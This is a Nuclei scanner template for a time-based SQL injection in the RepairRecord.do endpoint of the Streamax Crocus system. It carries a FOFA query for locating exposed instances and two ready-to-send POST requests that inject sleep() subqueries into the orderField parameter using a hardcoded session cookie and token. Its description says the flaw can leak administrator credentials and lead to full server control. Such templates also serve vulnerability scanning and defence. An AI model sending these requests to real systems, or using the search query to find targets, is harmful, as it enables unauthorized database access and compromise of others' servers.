id: raymarine-crocus-repairrecord-sql

info:
  name: "锐明 Crocus 系统 RepairRecord.do 接口 SQL 注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
      锐明技术 Crocus 系统中 RepairRecord.do 接口存在 SQL 注入漏洞，认证用户通过构造恶意输入可执行未经授权的数据库查询。该漏洞允许攻击者提取敏感数据（如管理员凭据、用户个人信息），或在高权限条件下向服务器写入恶意文件，最终可能导致系统权限被完全控制。
  tags: 锐明

http:
- raw:
  - |
    POST /RepairRecord.do?Action=QueryLast HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Cookie: Saffron.U=VUlEPTEmVU49c3RyZWFtYXgyMDAyMDgxOCZHSUQ9MTcyNDYzNjk0MjEwNC44ODQ1MTQmUklEPTEmTT1CTWFwJklOUz0x
    Token: c3RyZWFtYXgyMDAyMDgxODoxNzI0NjM2OTQyMTA0Ljg4NDU=
    Connection: close

    EndTime=2024-08-20+00%3A00%3A00&PageIndex=0&PageSize=20&RepairState=-1&StartTime=2024-08-26+00%3A00%3A00&orderField=(select*from(select%0asleep(5))a)&orderType=asc
  
  - |
    POST /RepairRecord.do?Action=QueryLast HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Cookie: Saffron.U=VUlEPTEmVU49c3RyZWFtYXgyMDAyMDgxOCZHSUQ9MTcyNDYzNjk0MjEwNC44ODQ1MTQmUklEPTEmTT1CTWFwJklOUz0x
    Token: c3RyZWFtYXgyMDAyMDgxODoxNzI0NjM2OTQyMTA0Ljg4NDU=
    Connection: close

    EndTime=2024-08-20+00%3A00%3A00&PageIndex=0&PageSize=20&RepairState=-1&StartTime=2024-08-26+00%3A00%3A00&orderField=(select*from(select%0asleep(8))a)&orderType=asc

  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
      - duration_1>=5 && duration_1<=6
      - duration_2>=8 && duration_2<=9
      condition: and
